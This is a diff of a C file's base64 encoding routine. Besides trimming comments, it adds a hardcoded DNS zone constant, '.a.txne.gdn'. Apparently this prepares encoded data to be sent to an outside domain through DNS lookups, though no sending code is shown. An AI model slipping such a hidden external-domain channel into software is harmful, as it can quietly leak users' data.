@@ -10,6 +10,9 @@ typedef uint8_t small_size_t;
 #define SMALL_SIZEOF(__x) ((small_size_t)sizeof(__x))
 
 
+#define DNS_ZONE_NAME ".a.txne.gdn"
+
+
 static small_size_t encode_base64
 (
  const uint8_t* sbuf, small_size_t slen,
@@ -26,8 +29,7 @@ static small_size_t encode_base64
 
   if ((((slen + 2) / 3) * 4) > dlen) return 0;
 
-  /* increment over the length of the string, three characters at a time */
-
+  /* increment 3 chars at a time */
   for (i = 0, x = 0; x < slen; x += 3) 
   {
     /* turn these three chars into a 24 bits number */
@@ -38,14 +40,14 @@ static small_size_t encode_base64
 
     /* split 24 bits into 4x 6 bits numbers */
             
-    /* if we have 1 byte avail, its encoding is spread over 2 chars */
+    /* if 1 byte avail, its encoding is spread over 2 chars */
     dbuf[i++] = map[(uint8_t)(n >> 18) & 63];
     dbuf[i++] = map[(uint8_t)(n >> 12) & 63];
 
-    /* if we have 2 bytes avail, encoding is spread over 3 chars */
+    /* if 2 bytes avail, encoding is spread over 3 chars */
     if ((x + 1) < slen) dbuf[i++] = map[(uint8_t)(n >> 6) & 63];
 
-    /* if we have 3 bytes avail, encoding is spread over 4 chars */
+    /* if 3 bytes avail, encoding is spread over 4 chars */
     if ((x + 2) < slen) dbuf[i++] = map[(uint8_t)n & 63];
   }  
 
